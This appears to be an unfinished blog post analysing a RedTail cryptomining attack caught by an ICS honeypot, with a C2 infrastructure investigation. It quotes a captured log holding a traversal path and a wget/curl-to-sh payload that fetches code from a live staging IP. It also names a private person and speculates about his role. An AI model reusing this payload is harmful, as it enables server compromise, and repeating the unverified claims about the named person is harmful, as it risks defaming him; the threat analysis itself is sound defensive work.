# RedTail Campaign

I set my ICS/SCADA honeypot (Conpot) up mainly to try and analyze/monitor attacks on industrial systems (this one poses as a PLC for an HVAC system), however the majority of the attempts I've noticed have been opportunistic web-based attacks targeting the associated page on port 80.

Recently, I've noticed some similar looking attacks coming from Asia, both trying to connect to a C2 server in Estonia.

## Log Analysis

Here is an example of one of the logs I captured:

```bash
2026-02-01 05:50:39,903 HTTP/1.1 POST request from ('101.36.123.102', 46080): 
Path: '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
Headers: [
    ('Host', '134.209.179.94:80'), 
    ('User-Agent', 'libredtail-http'), 
    ('Content-Type', 'text/plain'), 
    ('Content-Length', '119')
]
Payload: (wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) | sh -s apache.selfrep
```

`101.36.123.102` is most likely a compromised system whose owner has zero idea their device is being used as part of a botnet. This is less interesting.

A couple of things did stand out to me, most notably the very suspicious looking User-Agent, `libredtail-http`. This user agent is associated with a known cryptomining malware: RedTail, whose staging server is the same one I noticed: `178[.]16[.]55[.]224`.

Otherwise, the use of `%%32$65` is also an immediate red flag, as this is a double-encoded representation of the dot - `.`, used to bypass security filters in order to attempt directory traversal. The attacker is also using the || (OR) command to ensure that if `wget` is not present on the target system, the command falls back to using `curl` instead to fetch the malicious script from the C2 server.

You can also see that at the end, the command indicates that the script is intended to immediately begin scanning for other vulnerable Apache servers to continue infecting. This is the telltale sign of an attempt to add a vulnerable server to a botnet. In this case, the attackers are trying to recruit vulnerable web servers into mining crypto on their behalf.

## C2 Investigation

The attack made almost zero effort to obfusfcate its intent, so I spent more time investigating the staging server and who these cyber criminals may be.

The identity of the legal owner comes back to Railnet LLC, registered in Kentucky. However, the actual technical operator is an Estonian shell company named [API-VERSA](https://ariregister.rik.ee/eng/company/16832576/API-VERSA-O%C3%9C#:~:text=VERSA%20O%C3%9C%20(16832576)-,API%20VERSA%20O%C3%9C%20(16832576),Verification%20from%20Official%20Announcements%20failed.). I don't think there's much argument over that, considering the company has one repesentative, who is also the singular shareholder, with no employees. They were registered in 2023, but haven't submitted their annual reports for 2024 or 2025 (likely on purpose). The company is registered at a well-known virtual office address in Tallinn. Also the sole property of the company is listed as €1.

My logical assumption is that this was a shell company spun up 3 years ago as a legal barrier/shield for their operations. Estonia is a globally recognized digital leader, and running your cryptomining infrastructure through Estonia leaves less chance of your network being automatically blocked (as is the case with regions like Russia, North Korea, Moldova, etc.) An Estonian shell company can easily obtain trusted SSL/TLS certificates, which are then used by RedTail to encrypt its C2 traffic... Quite a smart move.

If the threat actors were working directly out of their home countries, modern firewalls, EDRs, and ISP rules would most likely immediately block their traffic. Traffic coming from places like Pyongyang, Moscow, Beijing are easily identifiable (e.g. 175.45.176.0/22 is the North korean IP space). So using Estonia as their administrative shell allows the threat actors to ride on the reputation that Estonia has amongst the West. A firewall/EDR solution would potentially see the traffic as coming from a legitimate business service located in Estonia (such as a small CSP), since there are so many legitimate smaller companies operating out of Estonia.

Estonia is unique in that it allows non-residents to open companies and then manage them remotely from anywhere in the world. They call it e-Residency. This easily enables threat actors, likely from Eastern Europe (proximity), to maintain a company there without ever having set foot in the EU. An Estonian private limited company can quite literally be established within minutes for a very low cost. It's practically disposable, and it takes no effort for the threat actor to spin up a new shell company.

The paper trail also leads to a man named Jacob Andrew Kristuli, supposedly a 31-year-old American living in Estonia (with a -440 credit score) with a €1 company and an Albanian phone number (interesting). 'Jacob' is more likely a synthetic identity used to sign the leases on the servers that power the RedTail botnet. By the time law enforcement knocks on the door of his virtual office in Tallinn, the attackers will have already moved on to their next identity, leaving 'Jacob' and his €1 shell company to be deleted by the registry.

It's most likely that Jacob Andrew Kristuli is a money mule who doesn't realize his name is being used by a criminal organization to run a global crypto mining botnet scheme. Or he could be a fake person. I always debate reaching out to people like that, because there's a chance that he is directly involved. 

Anyways, in layering their infrastructure across multiple countries, these RedTail actors are making it difficult for law enforcement. Just a quick overview:

- The US (Railnet LLC): For the ASN and legal registration.
- Estonia (API VERSA): For the administrative shell and management.

So this threat actor group is using an Estonian administrative shell to manage their US-registered network. This allows them to get around the geo-block, delay a takedown because of EU regulation, blend their traffic, and also wash their funds via fintech accounts like Revolut (these services will obviously not accept sanctioned entities, therefore the Jacob Andrew Kristuli identity). The threat actors can pay for their hosting and bandwidth using "clean" Euro or USD accounts, making the infrastructure self-sustaining and disconnected from the regime's sanctioned wallets.

## PLC Implications

For a PLC like the Siemens S7-1200 my Conpot is emulating, a cryptominer isn't just a resource thief, but a huge physical risk. By forcing an industrial controller to prioritize hash calculations over safety logic, the cryptomining malware effectively turns this precision instrument into a hot brick. In the world of HVAC (like a S7-1200 would be involved with), this might mean a burnt-out compressor; in other industries, it could mean much worse.

## The Lazarus Connection

## RedTail Evolving

## Self-rep

